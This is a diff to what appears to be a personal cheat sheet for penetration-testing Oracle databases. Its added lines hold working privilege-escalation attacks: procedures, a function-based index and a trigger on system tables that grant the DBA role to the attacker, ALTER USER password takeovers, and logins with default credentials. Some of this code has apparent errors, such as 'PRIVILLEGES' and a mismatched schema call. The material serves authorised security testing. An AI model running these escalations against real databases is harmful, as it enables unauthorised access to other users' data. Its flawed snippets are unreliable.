@@ -107,6 +107,7 @@ Grey-box penetration test (FROM (low privileged) database user TO privileged dat
 	+ ANALYZE ANY + CREATE PROCEDURE
 	+ CREATE ANY INDEX + CREATE PROCEDURE
 
+
 • Identify and exploit privileges escalation vulnerabilities that will allow you to get unauthorized access to sensitive data belonging to other users/schemas. 
   For example a regular db user with the following privilege(s) can escalate its privileges and access to other users’ data:
 	+ BECOME USER privilege
@@ -434,7 +435,10 @@ Shellcodes: No Result
 
 1. SQL*plus (Command line Oracle client)
 --------------------------------------------------------------
-pentester@LinuxVM > sqlplus /nolog					-- Linux
+
+> Linux
+--------
+pentester@LinuxVM > sqlplus /nolog
 	SQL> connect username/password@IP-address:port/SID
 	SQL> show user; 						-- show the current db user 
 	SQL > @/oracle/scripts/script.sql				-- run a script file called script.sql that was located in the /oracle/scripts directory.
@@ -455,10 +459,6 @@ pentester@LinuxVM > sqlplus /nolog					-- Linux
 	SQL> startup;							-- start the db
 	SQL> disconnect							-- disconnect
 
-	
-C:\ORACLE\sqlplus.exe /nolog						-- Windows	
-    SQL> connect username/password@IP-address:port/SID
-
 Other commands to login (examples):
 pentester@LinuxVM > sqlplus64 sys/change_on_install@//192.168.1.9:1521/orcl as sysdba
 pentester@LinuxVM > sqlplus64 sys/change_on_install@//192.168.1.10:1521/orcl as sysoper
@@ -466,12 +466,22 @@ pentester@LinuxVM > sqlplus64 system/manager@//192.168.1.136:1521/orcl
 pentester@LinuxVM > sqlplus64 dbsnmp/dbsnmp@//192.168.1.10:1521/orcl
 pentester@LinuxVM > sqlplus64 scott/tiger@//192.168.1.10:1521/orcl
 
-
 Personal notes:
 -Path: "/usr/lib/oracle/11.2/client64/bin/sqlplus" and "/opt/oracle/instantclient_10_2/sqlplus"
 -export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/lib/oracle/11.2/client64/lib
 -export PATH=$PATH:/usr/lib/oracle/11.2/client64/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
 
+> Windows
+---------
+C:\ORACLE\sqlplus.exe /nolog	
+    SQL> connect username/password@IP-address:port/SID
+    SQL> 
+OR
+C:\Users\pentester\Documents\Tools-Pentest\3-Databases\instantclient-sqlplus-windows.x64\instantclient_21_7> sqlplus.exe
+SQL*Plus: Release 21.0.0.0.0 - Production on Tue Apr 4 11:44:09 2023
+Version 21.7.0.0.0
+Copyright (c) 1982, 2022, Oracle.  All rights reserved.
+Enter user-name:
 
 
 2. DbVisualizer (GUI multi-database client)
@@ -592,7 +602,17 @@ On the GUI
  SQL> SELECT * FROM user_role_privs;			//list of role by users
  SQL> SELECT * FROM dba_roles;				//List which users/roles are granted which roles
  SQL> SELECT * FROM v$pwfile_users;			//Lists users who have been granted SYSDBA and SYSOPER privileges as derived from the password file
- SQL> SELECT * FROM user_sys_privs;			// Display the system privileges of the current user
+ SQL> SELECT * FROM user_sys_privs;			//Display the system privileges of the current user
+
+//Query to identify which roles have been granted an ANY privilege
+ SQL> set define on
+ SQL> SELECT LPAD(' ', 2*level) || granted_role "USER PRIVS"
+      FROM (SELECT NULL grantee, username AS GRANTED_ROLE FROM dba_users WHERE username LIKE UPPER('%&uname%')
+      UNION SELECT grantee, granted_role FROM dba_role_privs
+      UNION SELECT grantee, privilege FROM dba_sys_privs) WHERE granted_role LIKE '%ANY%'
+      START WITH grantee IS NULL
+      CONNECT BY grantee = prior granted_role;
+
 
  Extensive procedure granted to "PUBLIC"
  SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'UTL_HTTP' AND grantee = 'PUBLIC';
@@ -617,11 +637,13 @@ List of sensitive/dangerous SYSTEM privileges which can lead to database privile
 • DROP ANY TABLE 			= Drop or truncate any table in any schema.
 • LOCK ANY TABLE 			= Lock any table or view in any schema. 
 • SELECT ANY TABLE 			= Query any table, view, or snapshot in any schema. 
+• READ ANY TABLE			= Just as the SELECT object privilege, it allows to query tables, views, or materialized views in any schema in the database.
 • UPDATE ANY TABLE 			= Update rows in any table or view in any schema.
 • BACKUP ANY TABLE 			= Use the Export utility to incrementally export objects from the schema of other users.
 • CREATE TABLESPACE 			= Create tablespaces; add files to the operating system via Oracle, regardless of the user's operating system privileges.
 • ALTER TABLESPACE 			= Alter tablespaces; add files to the operating system via Oracle, regardless of the user's operating system privileges. 
 • CREATE ANY USER 			= Create users; assign quotas on any tablespace, set default and temporary tablespaces, and assign a profile as part of a CREATE USER statement.
+					  (e.g. SQL> CREATE USER newuser IDENTIFIED BY newpassword1; SQL> GRANT CREATE SESSION to newuser;)
 • BECOME ANY USER 			= Become another user. (Required by any user performing a full database import.)
 • ALTER USER 				= Alter other users: change any user's password or authentication method, assign tablespace quotas, set default and temporary tablespaces, assign profiles and default roles, in an ALTER USER statement. (Not required to alter own password.)
 • DROP USER 				= Drop another user. 
@@ -634,7 +656,6 @@ List of sensitive/dangerous SYSTEM privileges which can lead to database privile
 • ALTER ANY TRIGGER		    	= Enable, disable, or compile database triggers in any schema.
 • CREATE ANY INDEX		    	= Enables a user to create an index on any table or materialized view in the database.
 • ANALYZE ANY				= Analyze any table, cluster, or index in any schema
-
 
 
 * Metasploit - 'oraenum' module:
@@ -717,6 +738,32 @@ The role "GRANT ANY PRIVILEGE" allow a user to grant any privileges to any user.
 --------------------------------------
 	SQL> GRANT ALL PRIVILLEGES TO any_user_account; 
 	
+	//Then logon to the DB and you now have "all" privileges: 
+	
+	SQL> SELECT * FROM session_privs ORDER BY privilege;
+	
+	PRIVILEGE                              
+	----------------
+	<SNIP>	
+	SELECT ANY TABLE 
+	UPDATE ANY TABLE 
+	DROP ANY TABLE 
+	BACKUP ANY TABLE
+	<SNIP>	
+	CREATE USER
+	ALTER USER   
+	BECOME USER
+	<SNIP>	
+	CREATE ANY PROCEDURE                    
+	EXECUTE ANY PROCEDURE                   
+	EXECUTE ANY PROGRAM
+	EXECUTE ANY ASSEMBLY  
+	<SNIP>
+	CREATE ANY JOB 
+	CREATE EXTERNAL JOB
+	MANAGE SCHEDULER
+	<SNIP>
+	
 
 
 09.5. DB Privesc - Check for accounts with "BECOME USER", "CONNECT THROUGH" (proxy rights), "ALTER USER" privileges
@@ -732,7 +779,7 @@ A user with the privilege "ALTER USER" can change the password of any user (incl
 
 * Manual attack (proxy rights):
 -------------------------------
-	SQL> sqlplus64 /nolog
+	pentester@LinuxVM > sqlplus64 /nolog
         SQL> CONNECT sudo_user[user-target]/sudo_user_password@192.168.1.10/ORCL;
         SQL> SHOW USER
 	SQL> SELECT * FROM proxy_users;			//proxy=sudo_user and client=user-target
@@ -746,11 +793,10 @@ A user with the privilege "ALTER USER" can change the password of any user (incl
 
 * Manual attack (ALTER USER):
 -----------------------------	
-	SQL> sqlplus64 /nolog
+	pentester@LinuxVM > sqlplus64 /nolog
         SQL> CONNECT user1/user1_password@192.168.1.10/ORCL;	//e.g. 'user1' has 'ALTER USER' privilege
 	SQL> ALTER USER dbauser IDENTIFIED BY new-password;
 	SQL> ...
-
 
 
 09.6. DB & OS Privesc - Check for accounts with "CREATE/EXECUTE/UPDATE ANY PROCEDURE", "CREATE ANY TRIGER/INDEX", "ANALYZE ANY" privileges
@@ -764,6 +810,68 @@ With the following combinations of database system privileges, an Oracle user ma
 * Manual checks:
 ----------------
 SQL> SELECT * FROM DBA_SYS_PRIVS WHERE privilege='CREATE ANY PROCEDURE' OR privilege='EXECUTE ANY PROCEDURE' OR privilege='UPDATE ANY PROCEDURE' OR privilege='DROP ANY PROCEDURE' OR privilege='CREATE ANY TRIGER' OR privilege='CREATE ANY INDEX' OR privilege='ANALYZE ANY';
+or
+SQL> SELECT privilege FROM user_sys_privs UNION ALL SELECT granted_role FROM user_role_privs ORDER BY 1;
+
+* Manual attack (CREATE PROCEDURE + EXECUTE ANY PROCEDURE):	
+-----------------------------------------------------------
+        pentester@LinuxVM > sqlplus64 /nolog
+	SQL> CONNECT your_account/password@192.168.1.10/ORCL;
+	SQL> CREATE OR REPLACE PROCEDURE system.grant_dba_priv AUTHID DEFINER IS
+	     BEGIN
+	     EXECUTE IMMEDIATE 'GRANT dba TO your_account';
+	     END grant_dba_priv;
+	     /
+	SQL> EXEC system.grant_dba_priv;
+	SQL> SELECT granted_role FROM user_role_privs ORDER BY 1;
+
+* Manual attack (CREATE ANY INDEX + CREATE PROCEDURE):	
+------------------------------------------------------
+        pentester@LinuxVM > sqlplus64 /nolog
+	SQL> CONNECT your_account/password@192.168.1.10/ORCL;
+	SQL> CREATE OR REPLACE FUNCTION grant_dba_priv(col_name IN VARCHAR2)
+	     RETURN VARCHAR2 DETERMINISTIC AUTHID CURRENT_USER IS
+	     PRAGMA AUTONOMOUS_TRANSACTION;
+	     BEGIN
+	       EXECUTE IMMEDIATE uwclass.grant_dba_priv;
+	       RETURN UPPER(col_name);
+	     END grant_dba_priv;
+	     /
+	SQL> GRANT execute ON grant_dba_priv TO system;
+	SQL> CREATE INDEX system.ix_ol$_version ON system.ol$(your_account.grant_dba_priv(version));
+	SQL> INSERT INTO system.ol$ (category) VALUES ('BLABLA');
+	SQL> SELECT granted_role FROM user_role_privs ORDER BY 1;
+
+* Manual attack (CREATE ANY TRIGER + CREATE PROCEDURE):	
+------------------------------------------------------
+        pentester@LinuxVM > sqlplus64 /nolog
+	SQL> CONNECT your_account/password@192.168.1.10/ORCL;
+	SQL> CREATE OR REPLACE PROCEDURE uwclass.grant_dba_priv AUTHID DEFINER IS
+	     BEGIN
+	       EXECUTE IMMEDIATE 'GRANT dba TO your_account';
+	     END grant_dba_priv;
+	     /
+	SQL> SELECT atp.privilege, at.table_name FROM all_tables at, all_tab_privs atp
+	     WHERE atp.table_name = at.table_name
+	     AND at.owner = 'SYSTEM'
+	     AND atp.grantee = 'PUBLIC'
+	     AND atp.privilege = 'INSERT'
+	     ORDER BY 1;     
+		PRIVILEGE  TABLE_NAME
+		---------- -----------
+		INSERT     OL$
+		INSERT     OL$HINTS
+		INSERT     OL$NODES
+	SQL> GRANT execute ON grant_dba_priv TO system;
+	SQL> CREATE OR REPLACE TRIGGER system.bi_ol$
+	     BEFORE INSERT ON system.ol$
+	     FOR EACH ROW
+	     BEGIN
+	       uwclass.grant_dba_priv;
+	     END bi_ol$;
+	     /
+	SQL> INSERT INTO system.ol$ (category) VALUES ('BLABLA');
+	SQL> SELECT granted_role FROM user_role_privs ORDER BY 1;
 
 * Automatic checks and attacks with ODAT (Automatic OS and DB privilege escalation checks)
 ------------------------------------------------------------------------------------------	
@@ -787,6 +895,7 @@ SQL> SELECT * FROM DBA_SYS_PRIVS WHERE privilege='CREATE ANY PROCEDURE' OR privi
 		--exec-with-create-any-trigger, 
 		--exec-with-create-any-procedure, 
 		--exec-with-execute-any-procedure, 
+
 
 
 09.7. OS and DB Privesc - Check for accounts with the "JAVASYSPRIV" role 
